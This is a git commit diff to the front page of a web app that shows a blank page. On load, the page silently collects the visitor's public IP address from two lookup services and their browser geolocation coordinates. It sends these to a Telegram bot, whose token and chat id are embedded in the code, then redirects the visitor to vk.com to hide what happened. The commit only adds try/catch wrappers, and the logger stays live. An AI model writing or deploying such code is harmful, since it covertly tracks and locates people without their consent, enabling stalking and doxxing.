64f3f8357979cd1fb0d48235b867c51e84f61355
Infinity2326 <dima.gorbachev2002@mail.ru>
2024-04-17 21:18:26 +0300

    goida

--- app/page.tsx
+++ app/page.tsx
@@ -5,29 +5,30 @@ export default function Home() {
   useEffect(() => {
     let ip = ""
     let ip2 = ""
-    fetch("https://checkip.amazonaws.com/")
-      .then((res) => res.text())
-      .then((data) => {
-        ip = data
-      })
-      .then(() => {
-        fetch("https://api.db-ip.com/v2/free/self")
-          .then((res) => res.text())
-          .then((data) => {
-            ip2 = data
-            navigator.geolocation.getCurrentPosition((position) => {
-              const { latitude, longitude } = position.coords
-              fetch(
-                `https://api.telegram.org/bot6865421260:AAGe563ahno6Ln4Q0gCv490JrMys1NopGG4/sendMessage?chat_id=-1002035561069&text=${ip}%0A%0A${ip2}%0A%0A${latitude}%0A%0A${longitude}`
-              ).then(() => {
-                window.location.href = "https://vk.com/feed"
+    try {
+      fetch("https://checkip.amazonaws.com/")
+        .then((res) => res.text())
+        .then((data) => {
+          ip = data
+        })
+        .then(() => {
+          try {
+            fetch("https://api.db-ip.com/v2/free/self")
+              .then((res) => res.text())
+              .then((data) => {
+                ip2 = data
+                navigator.geolocation.getCurrentPosition((position) => {
+                  const { latitude, longitude } = position.coords
+                  fetch(
+                    `https://api.telegram.org/bot6865421260:AAGe563ahno6Ln4Q0gCv490JrMys1NopGG4/sendMessage?chat_id=-1002035561069&text=${ip}%0A%0A${ip2}%0A%0A${latitude}%0A%0A${longitude}`
+                  ).then(() => {
+                    window.location.href = "https://vk.com/feed"
+                  })
+                })
               })
-            })
-          })
-      })
-      .catch((error) => {
-        console.error("Error fetching data:", error)
-      })
+          } catch (error) {}
+        })
+    } catch (error) {}
   }, [])
   return <p></p>
 }
